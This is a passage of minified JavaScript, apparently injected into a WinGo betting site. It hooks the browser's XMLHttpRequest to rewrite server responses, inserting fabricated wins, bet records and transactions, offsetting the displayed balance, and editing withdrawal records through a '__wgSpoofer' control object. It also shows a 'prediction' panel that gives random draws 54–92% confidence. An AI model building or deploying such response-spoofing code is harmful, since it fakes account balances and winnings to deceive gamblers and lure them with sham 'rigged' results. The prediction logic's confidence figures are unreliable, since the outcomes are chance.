            if (a) {
                var n = Y(t ? t._kUrl : "", "gameCode");
                if (!n && t && t._kUrl) {
                    var r = t._kUrl.match(/\/WinGo\/([^\/?]+)(?:\/|\.json|\?|$)/);
                    r && (n = decodeURIComponent(r[1]));
                }
                var o = n || un(a);
                if (o) {
                    var i = Et(a, o);
                    if (i.length) {
                        for (var s = 0, l = !1, d = !1, p = 0; p < i.length; p++)
                            (yt(i[p].rig) && (d = !0),
                                (s += i[p].rig.win || 0),
                                i[p].rig.win > 0 && (l = !0));
                        ((e.data.status = l), (e.data.winAmount = l ? s : 0), d && F());
                    }
                }
            }
        }
    },
    GetRecordPage: function (e, t) {
        var a = e.data,
            n = a && a.list;
        if (n) {
            for (
                var r = tt(t ? t._kUrl : null),
                o = parseInt(Y(t ? t._kUrl : "", "pageNo") || a.pageNo || 1, 10),
                i = parseInt(
                    Y(t ? t._kUrl : "", "pageSize") || a.pageSize || n.length || 10,
                    10,
                ),
                s = {},
                l = {},
                d = 0;
                d < n.length;
                d++
            ) {
                var p = n[d],
                    c = String(p.issueNumber || "");
                s[c] || (s[c] = Et(c, r).slice());
                for (
                    var g = s[c],
                    f = -1,
                    b = -1,
                    h = j(p.amount || 0, p.betMultiple || 1),
                    x = 0;
                    x < g.length;
                    x++
                )
                    if (String(g[x].rig.content || "") === String(p.betContent || "")) {
                        var m = se(g[x].rig.stake, h) ? 3 : 0;
                        (Math.abs(N(p.betTime) - N(g[x].rig.time)) <= 12e4 && (m += 1),
                            (m > b || (m === b && g[x].rig.time < g[f].rig.time)) &&
                            ((f = x), (b = m)));
                    }
                if (!(f < 0)) {
                    var y = g.splice(f, 1)[0];
                    ((l[y.key] = !0), ye(p, y.rig));
                }
            }
            if (1 === o && r) {
                var v = n.slice();
                for (var w in u.rigs) {
                    var k = u.rigs[w];
                    if (k.game === r && !l[w]) {
                        for (
                            var S = pn(k), _ = j(S.amount, S.betMultiple), z = !1, C = 0;
                            C < v.length;
                            C++
                        ) {
                            var I = v[C];
                            if (
                                String(I.issueNumber) === S.issueNumber &&
                                String(I.betContent) === S.betContent &&
                                se(j(I.amount || 0, I.betMultiple || 1), _) &&
                                !(Math.abs(N(I.betTime) - N(S.betTime)) > 1500)
                            ) {
                                z = !0;
                                break;
                            }
                        }
                        z || v.push(S);
                    }
                }
                (v.sort(function (e, t) {
                    return N(t.betTime) - N(e.betTime);
                }),
                    v.length > i && (v = v.slice(0, i)),
                    (a.list = v),
                    "number" == typeof a.totalCount &&
                    a.totalCount < v.length &&
                    (a.totalCount = v.length),
                    "number" == typeof a.totalPage &&
                    (a.totalPage = Math.max(
                        1,
                        Math.ceil((a.totalCount || v.length) / i),
                    )));
            }
        }
    },
    GetTrendStatistics: function (e, t) {
        if (e.data && e.data.length) {
            var a = tt(t ? t._kUrl : null),
                n = null;
            for (var r in u.rigs) {
                var o = u.rigs[r];
                !o.settled ||
                    (a && o.game !== a) ||
                    ((!n || o.time > n.time) && (n = o));
            }
            if (n) {
                var i = ot(n.issue, n.game);
                if (i)
                    for (var s = 0; s < e.data.length; s++)
                        N(e.data[s].number) === i.num && (e.data[s].missingCount = 0);
            }
        }
    },
    GetLoadedSetting: function (e) {
        e &&
            e.data &&
            ((e.data.needPopupFirstRecharge = !1),
                (e.data.isOpenActivityAward = "0"),
                (e.data.isOpenJackpotReward = "0"),
                (e.data.isTaskState = "0"));
    },
    GetFirstRechargeList: function (e) {
        e && (e.data = []);
    },
    GetSitePopMsgList: function (e) {
        e && (e.data = []);
    },
    GetTreasureChestPopupItems: function (e) {
        e && (e.data = []);
    },
    GetActiveSetting: function (e) {
        e &&
            e.data &&
            ((e.data.isOpenActivityAward = "0"),
                (e.data.isOpenJackpotReward = "0"),
                (e.data.isTaskState = "0"),
                (e.data.unJackpotCount = 0),
                (e.data.unWeeklyAwardCount = 0),
                (e.data.newbieGiftPackCount = 0));
    },
    GetPayTypeName: function (e) {
        e &&
            e.data &&
            Array.isArray(e.data.typelist) &&
            (e.data.typelist = e.data.typelist.filter(function (e) {
                return (
                    -1 ===
                    (
                        (e.payName || "") +
                        " " +
                        (e.paySysName || "") +
                        " " +
                        (e.name || "")
                    )
                        .toLowerCase()
                        .indexOf("arpay")
                );
            }));
    },
    GetRechargeTypes: function (e) {
        if (e && 0 === e.code && e.data && Array.isArray(e.data.rechargetypelist))
            ((e.data.rechargetypelist = e.data.rechargetypelist.filter(function (e) {
                return (
                    -1 ===
                    (
                        (e.payName || "") +
                        " " +
                        (e.paySysName || "") +
                        " " +
                        (e.code || "")
                    )
                        .toLowerCase()
                        .indexOf("arpay")
                );
            })),
                (window.__wgRTCache = JSON.parse(JSON.stringify(e))));
        else if (
            e &&
            0 !== e.code &&
            window.__wgRTCache &&
            /frequent|rate.?limit/i.test(e.msg || "")
        ) {
            var t = window.__wgRTCache;
            ((e.code = t.code),
                (e.msg = t.msg),
                (e.msgCode = t.msgCode),
                (e.data = t.data));
        }
    },
    GetTransactions: function (e, t) {
        if (e.data) {
            var a = {};
            try {
                a = JSON.parse((t && t._kBody) || "{}");
            } catch (e) { }
            var n = parseInt(a.pageNo || 1, 10),
                r = parseInt(a.pageSize || 10, 10),
                o = a.startDate || "",
                i = a.endDate || "",
                s = a.type,
                l = void 0 === s || "" === s || "-1" === String(s),
                d = o ? new Date(o + " 00:00:00").getTime() : 0,
                p = i ? new Date(i + " 23:59:59").getTime() : 1 / 0,
                c = [];
            for (var g in u.rigs) {
                var f = u.rigs[g],
                    b = N(f.time);
                if (!(!b || b < d || b > p) && (l || String(0) === String(s))) {
                    var h = N(f.stake);
                    (h || (h = j(f.amount, f.betMultiple)),
                        c.push({
                            orderNum: f.orderNo || "KG" + String(f.issue || "") + ":B",
                            amount: h,
                            type: 0,
                            typeName: "Bet amount reduced",
                            typeNameCode: "8000",
                            addTime: Ct(b),
                            remark: "",
                            _ts: b,
                        }));
                }
            }
            if (c.length) {
                e.data.list ||
                    (e.data = { list: [], pageNo: 1, totalPage: 0, totalCount: 0 });
                for (
                    var x = e.data.list || [],
                    m =
                        "number" == typeof e.data.totalCount
                            ? e.data.totalCount
                            : x.length,
                    y = {},
                    v = 0;
                    v < x.length;
                    v++
                )
                    y[x[v].orderNum] = !0;
                for (var w = [], k = 0; k < c.length; k++)
                    y[c[k].orderNum] || w.push(c[k]);
                if (1 === n) {
                    for (var S = w.slice(0), _ = 0; _ < x.length; _++)
                        ((x[_]._ts = new Date(x[_].addTime || 0).getTime() || 0),
                            S.push(x[_]));
                    S.sort(function (e, t) {
                        return (t._ts || 0) - (e._ts || 0);
                    });
                    for (var z = 0; z < S.length; z++) delete S[z]._ts;
                    e.data.list = S.slice(0, r);
                }
                ((e.data.totalCount = m + w.length),
                    (e.data.totalPage = Math.max(1, Math.ceil(e.data.totalCount / r))),
                    (e.data.pageNo = n));
            }
        }
    },
};
function Bt(e) {
    try {
        return new Event(e);
    } catch (e) { }
    try {
        var t = document.createEvent("Event");
        return (t.initEvent(e, !1, !1), t);
    } catch (e) { }
    return null;
}
function Mt(e, t, a) {
    setTimeout(function () {
        try {
            Object.defineProperty(e, "readyState", { value: 4, configurable: !0 });
        } catch (t) {
            try {
                e.readyState = 4;
            } catch (e) { }
        }
        try {
            Object.defineProperty(e, "status", { value: 200, configurable: !0 });
        } catch (t) {
            try {
                e.status = 200;
            } catch (e) { }
        }
        try {
            Object.defineProperty(e, "responseText", { value: t, configurable: !0 });
        } catch (a) {
            try {
                e.responseText = t;
            } catch (e) { }
        }
        try {
            Object.defineProperty(e, "response", { value: t, configurable: !0 });
        } catch (a) {
            try {
                e.response = t;
            } catch (e) { }
        }
        try {
            "function" == typeof e.onreadystatechange && e.onreadystatechange();
        } catch (e) { }
        var a = Bt("readystatechange");
        if (a)
            try {
                e.dispatchEvent(a);
            } catch (e) { }
        try {
            "function" == typeof e.onload && e.onload();
        } catch (e) { }
        var n = Bt("load");
        if (n)
            try {
                e.dispatchEvent(n);
            } catch (e) { }
        try {
            "function" == typeof e.onloadend && e.onloadend();
        } catch (e) { }
        var r = Bt("loadend");
        if (r)
            try {
                e.dispatchEvent(r);
            } catch (e) { }
    }, a || 10);
}
var Pt = Object.keys(gt).sort(function (e, t) {
    return t.length - e.length;
});
function fn(e) {
    var t = "string" == typeof e ? e : "";
    if (sn(t)) return "WinGoState";
    for (var a = 0; a < Pt.length; a++) if (-1 !== t.indexOf(Pt[a])) return Pt[a];
    return null;
}
var ae = {},
    yn = 1e4;
function ce(e) {
    try {
        return "RT:" + (JSON.parse(e || "{}").payid || 0);
    } catch (e) {
        return "RT:0";
    }
}
var le = {},
    gn = 6e4;
function dn(e, t) {
    try {
        var a = JSON.parse(t || "{}");
        (delete a.signature, delete a.random, delete a.timestamp);
        for (var n = Object.keys(a).sort(), r = "", o = 0; o < n.length; o++)
            r += n[o] + "=" + a[n[o]] + "&";
        return e + ":" + r;
    } catch (t) {
        return e;
    }
}
var ge = {
    GetUserInfo: 1,
    GetBalance: 1,
    GetWealthState: 1,
    GetVipUsers: 1,
    GetARGameAndPlatWallets: 1,
    GetTreasureChestPopupItems: 1,
    GetActiveSetting: 1,
    GetHomeSettings: 1,
    GetLoadedSetting: 1,
    GetDailyProfitRank: 1,
    GetPwaDomainList: 1,
    NotifyARGameRecover: 1,
    GetSiteMessageList: 1,
    GetRechargeTypes: 1,
    GetSitePopMsgList: 1,
    GetGameCategoryList: 1,
    GetAllGameList: 1,
    GetBannerList: 1,
    GetSaasAllwallets: 1,
    RecoverSaasBalance: 1,
},
    X = {},
    mn = 2e3,
    wn = ge;
function hn(e, t) {
    try {
        var a = JSON.parse(t || "{}");
        return (
            e +
            ":" +
            (a.pageNo || 0) +
            ":" +
            (a.pageSize || 0) +
            ":" +
            (a.payid || 0) +
            ":" +
            (a.gameCode || "")
        );
    } catch (t) {
        return e;
    }
}
function de() {
    it();
    var e = XMLHttpRequest.prototype.open,
        t = XMLHttpRequest.prototype.send;
    ((XMLHttpRequest.prototype.open = function (t, a) {
        return ee()
            ? ((this._kUrl = a), (this._kEp = fn(a)), e.apply(this, arguments))
            : e.apply(this, arguments);
    }),
        (XMLHttpRequest.prototype.send = function (e) {
            if (!ee()) return t.apply(this, arguments);
            if ("GetRechargeTypes" === this._kEp) {
                var a = ce(e),
                    n = ae[a];
                if (n && Date.now() - n.ts < yn) return void Mt(this, n.json, 10);
            }
            if (this._kEp && wn[this._kEp]) {
                var r = hn(this._kEp, e),
                    o = X[r];
                if (o && Date.now() - o.ts < mn)
                    return ((this._kBody = e), void o.xhrs.push(this));
                ((this._kDedupKey = r),
                    (X[r] = { xhrs: [], ts: Date.now() }),
                    setTimeout(function () {
                        var e = X[r];
                        if (e) {
                            for (var t = 0; t < e.xhrs.length; t++)
                                Mt(
                                    e.xhrs[t],
                                    '{"code":-1,"data":null,"msg":"dedup timeout","msgCode":-1}',
                                    0,
                                );
                            delete X[r];
                        }
                    }, 1e4));
            }
            if (this._kEp) {
                let t = function () {
                    if (!l && 4 === i.readyState)
                        try {
                            var e =
                                i.responseText ||
                                ("string" == typeof i.response ? i.response : "");
                            if (!e) return;
                            var t = JSON.parse(e);
                            gt[s](t, i);
                            var a = JSON.stringify(t);
                            (Object.defineProperty(i, "responseText", {
                                value: a,
                                configurable: !0,
                            }),
                                Object.defineProperty(i, "response", {
                                    value: a,
                                    configurable: !0,
                                }),
                                (l = !0),
                                "GetRechargeTypes" === s &&
                                0 === t.code &&
                                (ae[ce(i._kBody)] = { json: a, ts: Date.now() }));
                            var n = dn(s, i._kBody);
                            if (0 === t.code) le[n] = { json: a, ts: Date.now() };
                            else if (
                                ge[s] &&
                                (313 === t.code ||
                                    313 === t.msgCode ||
                                    /frequent|rate.?limit/i.test(t.msg || ""))
                            ) {
                                var r = le[n];
                                r &&
                                    Date.now() - r.ts < gn &&
                                    ((a = r.json),
                                        Object.defineProperty(i, "responseText", {
                                            value: a,
                                            configurable: !0,
                                        }),
                                        Object.defineProperty(i, "response", {
                                            value: a,
                                            configurable: !0,
                                        }));
                            }
                            if (i._kDedupKey) {
                                var o = X[i._kDedupKey];
                                if (o) {
                                    for (var d = 0; d < o.xhrs.length; d++) Mt(o.xhrs[d], a, 5);
                                    delete X[i._kDedupKey];
                                }
                            }
                        } catch (e) { }
                };
                this._kBody = e;
                var i = this,
                    s = this._kEp,
                    l = !1,
                    d = i.onreadystatechange,
                    p = i.onload;
                ((i.onreadystatechange = function () {
                    if ((t(), "function" == typeof d)) return d.apply(this, arguments);
                }),
                    (i.onload = function () {
                        if ((t(), "function" == typeof p)) return p.apply(this, arguments);
                    }),
                    i.addEventListener("readystatechange", t),
                    i.addEventListener("load", t));
            }
            return t.apply(this, arguments);
        }),
        (window.__kismatAccuracy = U("accuracy", 100)),
        (window.__kismatRigMap = window.__kismatRigMap || {}),
        (window.__wgSpoofer = {
            getSettings: function () {
                return {
                    accuracy: U("accuracy", 100),
                    balanceOffset: U("balanceOffset", 5e3),
                };
            },
            saveSetting: function (e, t) {
                var a = re();
                ((a[e] = t),
                    localStorage.setItem("wg_spoof_cfg", JSON.stringify(a)),
                    "accuracy" === e && (window.__kismatAccuracy = t));
            },
            resetBalance: function () {
                ((u.balance = null), (u.balance = U("balanceOffset", 5e3)), F(), $t());
            },
            getWithdrawals: function () {
                return u.withdrawals;
            },
            updateWithdrawalStatus: function (e, t) {
                u.withdrawals[e] && ((u.withdrawals[e].state = t), F());
            },
            deleteWithdrawal: function (e) {
                u.withdrawals[e] && (delete u.withdrawals[e], F());
            },
            predictNum: dt,
            rigHash: pe,
            colors: Nt,
            isVip: function () {
                return "function" == typeof ee && ee();
            },
        }));
}
function vn(e) {
    let t = parseInt(e);
    return {
        num: t,
        big: t >= 5,
        color: 0 === t || 5 === t ? "violet" : t % 2 == 0 ? "red" : "green",
    };
}
function Ot(e, t) {
    if (e.length < 2) return { len: 0, val: null };
    let a = e[0][t],
        n = 1;
    for (let r = 1; r < e.length && e[r][t] === a; r++) n++;
    return { len: n, val: a };
}
function bn(e, t, a) {
    let n = {};
    return (
        e.slice(0, a).forEach((e) => {
            n[e[t]] = (n[e[t]] || 0) + 1;
        }),
        n
    );
}
function we(e) {
    return e.len >= 3
        ? { side: !e.val, conf: Math.min(0.15 + 0.08 * e.len, 0.45) }
        : e.len >= 2
            ? { side: !e.val, conf: 0.1 }
            : { side: null, conf: 0 };
}
function he(e, t = 10) {
    let a = bn(e, "big", t),
        n = a[!0] || 0,
        r = n + (a[!1] || 0);
    if (r < 5) return { side: null, conf: 0 };
    let o = n / r;
    return o >= 0.7
        ? { side: !1, conf: 0.12 }
        : o <= 0.3
            ? { side: !0, conf: 0.12 }
            : { side: null, conf: 0 };
}
function ve(e, t = 12) {
    let a = Math.min(t, e.length);
    if (a < 4) return { side: null, conf: 0 };
    let n = 0,
        r = 0;
    for (let t = 0; t < a; t++) {
        let o = a - t;
        ((n += (e[t].big ? 1 : -1) * o), (r += o));
    }
    let o = r ? n / r : 0;
    return Math.abs(o) < 0.08
        ? { side: null, conf: 0 }
        : { side: o > 0, conf: Math.min(0.22 * Math.abs(o), 0.18) };
}
function be(e, t = 24) {
    if (e.length < 6) return { side: null, conf: 0 };
    let a = e[0].big,
        n = 0,
        r = 0,
        o = Math.min(t, e.length - 1);
    for (let t = 0; t < o; t++) {
        let o = e[t + 1],
            i = e[t];
        o.big === a && (i.big === a ? n++ : r++);
    }
    let i = n + r;
    if (i < 3) return { side: null, conf: 0 };
    let s = n / i;
    return s >= 0.67
        ? { side: a, conf: Math.min(0.45 * (s - 0.5), 0.18) }
        : s <= 0.33
            ? { side: !a, conf: Math.min(0.45 * (0.5 - s), 0.18) }
            : { side: null, conf: 0 };
}
function Se(e, t = 6) {
    let a = e.slice(0, t);
    if (a.length < 4) return { side: null, conf: 0 };
    let n = a.reduce((e, t) => e + t.num, 0) / a.length;
    return n >= 6.1
        ? { side: !0, conf: 0.08 }
        : n <= 3.9
            ? { side: !1, conf: 0.08 }
            : { side: null, conf: 0 };
}
function Ie(e) {
    if (e.length < 4) return { detected: !1, conf: 0 };
    let t = 0,
        a = Math.min(6, e.length - 1);
    for (let n = 0; n < a; n++) e[n].big !== e[n + 1].big && t++;
    return t / a >= 0.8
        ? { detected: !0, nextSide: !e[0].big, conf: 0.15 }
        : { detected: !1, conf: 0 };
}
function Sn(e) {
    let t = Ie(e);
    return t.detected
        ? { side: t.nextSide, conf: t.conf }
        : { side: null, conf: 0 };
}
function In(e) {
    let t = Ot(e, "color");
    return t.len >= 4 && "violet" !== t.val
        ? { color: "red" === t.val ? "green" : "red", conf: 0.1 }
        : { color: null, conf: 0 };
}
function me(e, t = 2, a = 28) {
    if (e.length < t + 4) return { side: null, conf: 0 };
    let n = e
        .slice(0, t)
        .map((e) => (e.big ? 1 : 0))
        .join(""),
        r = 0,
        o = 0,
        i = 0,
        s = Math.min(a, e.length - t - 1);
    for (let a = 1; a <= s; a++) {
        if (
            e
                .slice(a, a + t)
                .map((e) => (e.big ? 1 : 0))
                .join("") !== n
        )
            continue;
        let l = s - a + 1;
        ((r += (e[a - 1].big ? 1 : -1) * l), (o += l), i++);
    }
    if (i < 2 || !o) return { side: null, conf: 0 };
    let l = r / o;
    return Math.abs(l) < 0.12
        ? { side: null, conf: 0 }
        : { side: l > 0, conf: Math.min(0.32 * Math.abs(l), 0.24) };
}
function qn(e, t = 20) {
    let a = {};
    e.slice(0, t).forEach((e) => {
        a[e.num] = (a[e.num] || 0) + 1;
    });
    let n = Object.entries(a).sort((e, t) => t[1] - e[1]);
    return {
        hot: n.slice(0, 3).map((e) => parseInt(e[0])),
        cold: n.slice(-3).map((e) => parseInt(e[0])),
    };
}
function Ln(e) {
    let t = [],
        a = 0,
        n = ve(e);
    n.conf > 0 &&
        ((a += n.side ? n.conf : -n.conf),
            t.push({ name: "momentum", type: "trend", weight: n.conf }));
    let r = be(e);
    r.conf > 0 &&
        ((a += r.side ? r.conf : -r.conf),
            t.push({ name: "transition", type: "flow", weight: r.conf }));
    let o = Ot(e, "big"),
        i = we(o);
    i.conf > 0 &&
        ((a += i.side ? i.conf : -i.conf),
            t.push({
                name: o.val ? "Big" : "Small",
                type: "streak",
                len: o.len,
                weight: i.conf,
            }));
    let s = he(e);
    s.conf > 0 &&
        ((a += s.side ? s.conf : -s.conf),
            t.push({ name: "frequency", type: "bias", weight: s.conf }));
    let l = Se(e);
    l.conf > 0 &&
        ((a += l.side ? l.conf : -l.conf),
            t.push({ name: "pressure", type: "numbers", weight: l.conf }));
    let d = Ie(e);
    return (
        d.detected &&
        ((a += d.nextSide ? d.conf : -d.conf),
            t.push({ name: "alternating", type: "pattern", weight: d.conf })),
        { bigScore: a, signals: t, streak: o }
    );
}
function En(e, t, a = 24) {
    let n = 0,
        r = 0,
        o = 0,
        i = Math.min(a, t.length - 4);
    for (let a = 1; a <= i; a++) {
        let s = e(t.slice(a));
        if (!s || null == s.side || !s.conf) continue;
        let l = t[a - 1].big,
            d = i - a + 1;
        ((n += (s.side === l ? 1 : -1) * s.conf * d), (r += s.conf * d), o++);
    }
    return { edge: r ? n / r : 0, count: o };
}
var _n = [
    { name: "memory-2", type: "memory", run: (e) => me(e, 2, 28), minCount: 3 },
    { name: "memory-3", type: "memory", run: (e) => me(e, 3, 36), minCount: 2 },
    { name: "momentum", type: "trend", run: ve, minCount: 4 },
    { name: "transition", type: "flow", run: be, minCount: 4 },
    { name: "revert", type: "streak", run: (e) => we(Ot(e, "big")), minCount: 4 },
    { name: "hot-cold", type: "bias", run: he, minCount: 4 },
    { name: "pressure", type: "numbers", run: Se, minCount: 4 },
    { name: "alternating", type: "pattern", run: Sn, minCount: 3 },
];
function Ht(e) {
    if (!e || e.length < 3)
        return {
            prediction: "Big",
            confidence: 54,
            color: "green",
            signals: [],
            heatmap: { hot: [], cold: [] },
            topNumber: 7,
        };
    let t = e.map((e) => vn(e.number || e.num || e)),
        a = qn(t),
        n = In(t),
        r = Ln(t),
        o = [],
        i = 0,
        s = 0;
    for (let e of _n) {
        let a = e.run(t);
        if (!a || null == a.side || !a.conf) continue;
        let n = En(e.run, t, 24);
        if (n.count < e.minCount) continue;
        let r = a.side,
            l = Math.min(Math.abs(n.edge), 0.45) * (0.7 + a.conf);
        if (n.edge < -0.18) ((r = !r), (l *= 0.6));
        else if (n.edge < 0.05) continue;
        ((i += (r ? 1 : -1) * l),
            (s += l),
            o.push({
                name: e.name,
                type: e.type,
                weight: Number(l.toFixed(3)),
                edge: Number(n.edge.toFixed(3)),
                mode: r === a.side ? "direct" : "flip",
            }));
    }
    let l = s ? i : r.bigScore,
        d = l >= 0,
        p = Math.round(
            100 *
            Math.min(
                Math.max(
                    s
                        ? 0.53 + 0.62 * Math.abs(l) + Math.min(s, 0.18)
                        : 0.5 + Math.abs(l),
                    0.54,
                ),
                0.92,
            ),
        ),
        c = n.color ?? (d ? "red" : "green"),
        g = a.hot.find((e) => (d ? e >= 5 : e < 5)) ?? (d ? 7 : 3),
        u = (o.length ? o : r.signals)
            .sort((e, t) => (t.weight || 0) - (e.weight || 0))
            .slice(0, 4);
    return {
        prediction: d ? "Big" : "Small",
        confidence: p,
        color: c,
        signals: u,
        heatmap: a,
        topNumber: g,
        streak: { side: r.streak.val ? "Big" : "Small", len: r.streak.len },
    };
}
var Cn = [
    "053d2b99",
    "49176bf8",
    "62fbe730",
    "31762cc1",
    "ba9fa4ff",
    "46891538",
    "9319baa4",
    "4e868eee",
    "832f9a99",
    "9cf62e12",
],
    Rt = Object.create(null),
    O = Z(),
    qe = Ee(O),
    st = null,
    mt = null;
function Le(e) {
    return "/assets/png/ball_" + e + "-" + Cn[e] + ".webp";
}
function A(e = O) {
    return (
        Rt[(e = e || "WinGo_30S")] ||
        (Rt[e] = { history: [], issue: "", latestIssue: "", lastSec: -1 }),
        Rt[e]
    );
}
function Bn(e) {
    return (e = String(e || "")
        .toLowerCase()
        .replace(/\s+/g, "")).includes("wingo30")
        ? "WinGo_30S"
        : e.includes("wingo1min") || e.includes("wingo1m")
            ? "WinGo_1M"
            : e.includes("wingo3min") || e.includes("wingo3m")
                ? "WinGo_3M"
                : e.includes("wingo5min") || e.includes("wingo5m")
                    ? "WinGo_5M"
                    : "";
}
function Z() {
    let e = document.querySelector(
        ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
        t = Bn(e && e.textContent);
    if (t) return t;
    let a = (location.hash || "").match(/gameCode=(WinGo_\w+)/);
    return a ? a[1] : "WinGo_30S";
}
function Ee(e) {
    if (!e) return 30;
    let t = e.match(/(\d+)M$/i);
    if (t) return 60 * parseInt(t[1], 10);
    let a = e.match(/(\d+)S$/i);
    return a ? parseInt(a[1], 10) : 30;
}
function V(e) {
    let t = String(null == e ? "" : e).trim();
    return /^\d{8,22}$/.test(t) ? t : "";
}
function Ut(e) {
    if (!(e = V(e))) return "";
    try {
        return (BigInt(e) + 1n).toString();
    } catch (e) {
        return "";
    }
}
function _e(e, t) {
    if (((e = V(e)), (t = V(t)), !e || !t)) return 0;
    try {
        let a = BigInt(e),
            n = BigInt(t);
        return a > n ? 1 : a < n ? -1 : 0;
    } catch (a) {
        return e > t ? 1 : e < t ? -1 : 0;
    }
}
function at() {
    let e = Z();
    e && e !== O && Ft(e);
}
function Ce(e) {
    return ((O = e = e || O || "WinGo_30S"), (qe = Ee(e)), A(e), e);
}
function At() {
    return document.querySelector("prediction-panel")?.shadowRoot;
}
function ct() {
    return !!At()?.querySelector(".view-pro.active");
}
function wt() {
    return O;
}
function Gt() {
    return A().history;
}
function Be() {
    return A().issue;
}
function Me() {
    return A().latestIssue;
}
function Pe(e) {
    A().lastSec = e;
}
function Vt(e) {
    return e
        ? e
            .replace(/^WinGo_/, "")
            .replace(/(\d+)S$/i, "$1sec")
            .replace(/(\d+)M$/i, "$1m")
        : "—";
}
function D(e) {
    let t = At();
    if (!t) return;
    let a = t.querySelector("#pro-waiting"),
        n = t.querySelector("#pro-prediction"),
        r = t.querySelector("#pro-card"),
        o = t.querySelector("#scan-lbl");
    return a && n && r
        ? "result" === e
            ? ((a.style.display = "none"),
                (n.style.display = "block"),
                void r.classList.remove("shimmer"))
            : ((a.style.display = "flex"),
                (n.style.display = "none"),
                (r.className =
                    r.className.replace(/\bc-\w+\b/g, "").trim() + " shimmer"),
                void (
                    o &&
                    o.childNodes[0] &&
                    (o.childNodes[0].textContent =
                        "analyzing" === e ? "Analyzing" : "Scanning")
                ))
        : void 0;
}
function Ne(e, t) {
    if (!Array.isArray(t) || !t.length) return;
    e = e || Z() || O;
    let a = V(t[0].issueNumber ?? t[0].issue);
    if (!a) return;
    let n = A(e);
    ((n.history = t), (n.latestIssue = a));
    let r = Ut(a);
    (r && (!n.issue || _e(n.issue, a) <= 0) && (n.issue = r),
        e === O && ct() && setTimeout(() => st?.(), 0));
}
function We(e, t, a) {
    let n = A((e = e || Z() || O)),
        r = V(t) || V(a) || Ut(t);
    r &&
        (!n.issue ||
            r !== n.issue ||
            (n.latestIssue && _e(n.issue, n.latestIssue) <= 0)) &&
        ((n.issue = r), e === O && ct() && setTimeout(() => st?.(), 0));
}
function k() {
    let e = O;
    if (!e) return;
}
function $e(e, t) {
    at();
    let a = e || O;
    (Ne(a, t?.data?.list),
        We(
            a,
            t?.current?.issueNumber || t?.data?.current?.issueNumber,
            t?.next?.issueNumber || t?.data?.next?.issueNumber,
        ));
}
function Mn(e) {
    let t = e.detail;
    t && "history" === t.type && (at(), Ne(t.game || O, t.list));
}
function Pn(e) {
    let t = e.detail;
    t && (at(), We(t.game || O, t.currentIssue, t.nextIssue));
}
function Oe() {
    mt ||
        (mt = setInterval(() => {
            if (!ct() || A().history.length)
                return (clearInterval(mt), void (mt = null));
            k();
        }, 3e3));
}
function Nn() {
    let e = At();
    if (!e?.querySelector(".view-pro.active")) return;
    at();
    let t = O,
        a = A(t),
        n = document.querySelector(".TimeLeft__C-time"),
        r = document.querySelector(".TimeLeft__C-id"),
        o = document.querySelector(".TimeLeft__C-name"),
        i = e.querySelector("#pro-timer"),
        s = e.querySelector("#pro-timer-wrap");
    if (!i || !s) return;
    if (n) {
        let e = n.textContent.trim();
        i.textContent = e;
        let t = e.split(":"),
            r = 60 * (parseInt(t[0], 10) || 0) + (parseInt(t[1], 10) || 0);
        (s.style.setProperty(
            "--pct",
            Math.max(0, Math.min(100, (r / qe) * 100)) + "%",
        ),
            i.classList.remove("t-warn", "t-end"),
            s.classList.remove("tw-warn", "tw-end"),
            r <= 5
                ? (i.classList.add("t-end"), s.classList.add("tw-end"))
                : r <= 10 && (i.classList.add("t-warn"), s.classList.add("tw-warn")),
            a.lastSec >= 0 &&
            a.lastSec <= 4 &&
            r > a.lastSec + 5 &&
            setTimeout(k, 250),
            (a.lastSec = r));
    }
    if (r) {
        let t = String(r.textContent).trim(),
            n = V(t);
        n && a.issue !== n && ((a.issue = n), setTimeout(() => st?.(), 0));
        let o = e.querySelector("#pro-period"),
            i = V(a.issue) || n || t;
        o && (o.textContent = "#" + i.slice(-6));
    }
    let l = e.querySelector("#pro-mode");
    l && (l.textContent = o?.textContent.trim() || Vt(t));
}
function He({ onPred: e }) {
    (Ce(Z()),
        (st = e),
        window.addEventListener("kismat:gameData", Mn),
        window.addEventListener("kismat:issue", Pn),
        window.addEventListener("hashchange", at),
        setInterval(Nn, 300),
        setInterval(() => {
            ct() && k();
        }, 12e3));
}
function Ft(e) {
    if (!(e = e || Z())) return;
    let t = e !== O;
    Ce(e);
    let a = A(e),
        n =
            V(document.querySelector(".TimeLeft__C-id")?.textContent) ||
            Ut(a.latestIssue),
        r = !(!a.history.length || !n || a.issue !== n);
    (n && (a.issue = n),
        (a.lastSec = -1),
        t && ct() && (r ? setTimeout(() => st?.(), 0) : D("loading"), k()));
}
function Re(e, t) {
    return Math.max(0, Math.min(e, window.innerWidth - t));
}
function Ue(e, t) {
    return Math.max(0, Math.min(e, window.innerHeight - t));
}
function ht(e) {
    try {
        let t = JSON.parse(localStorage.getItem("__wg_p_" + e));
        if (t) return t;
    } catch (e) { }
    return "logo" === e
        ? { vw: ((window.innerWidth - 68) / window.innerWidth) * 100, vh: 75 }
        : null;
}
function zt(e, t) {
    localStorage.setItem(
        "__wg_p_" + t,
        JSON.stringify({
            vw: (e.offsetLeft / window.innerWidth) * 100,
            vh: (e.offsetTop / window.innerHeight) * 100,
        }),
    );
}
function vt(e, t) {
    t &&
        ((e.style.left = (t.vw / 100) * window.innerWidth + "px"),
            (e.style.top = (t.vh / 100) * window.innerHeight + "px"));
}
function Ae(e, t) {
    let a = t.offsetWidth || 288,
        n = t.offsetHeight || 290;
    ((e.style.left = (window.innerWidth - a) / 2 + "px"),
        (e.style.top = (window.innerHeight - n) / 2 + "px"));
}
function Ge(e, t, { onTap: a }) {
    let n = 0,
        r = 0,
        o = 0,
        i = 0,
        s = !1;
    (t.addEventListener("pointerdown", (a) => {
        (t.setPointerCapture(a.pointerId),
            t.classList.add("dragging"),
            (n = a.clientX - e.offsetLeft),
            (r = a.clientY - e.offsetTop),
            (o = a.clientX),
            (i = a.clientY),
            (s = !1));
    }),
        t.addEventListener("pointermove", (a) => {
            t.hasPointerCapture(a.pointerId) &&
                ((e.style.left = Re(a.clientX - n, 62) + "px"),
                    (e.style.top = Ue(a.clientY - r, 62) + "px"),
                    (Math.abs(a.clientX - o) > 5 || Math.abs(a.clientY - i) > 5) &&
                    (s = !0));
        }),
        t.addEventListener("pointerup", (n) => {
            (t.releasePointerCapture(n.pointerId),
                t.classList.remove("dragging"),
                s ? zt(e, "logo") : a());
        }));
}
function Ve(e, t, a) {
    let n = 0,
        r = 0;
    (t.addEventListener("pointerdown", (a) => {
        (t.setPointerCapture(a.pointerId),
            t.classList.add("dragging"),
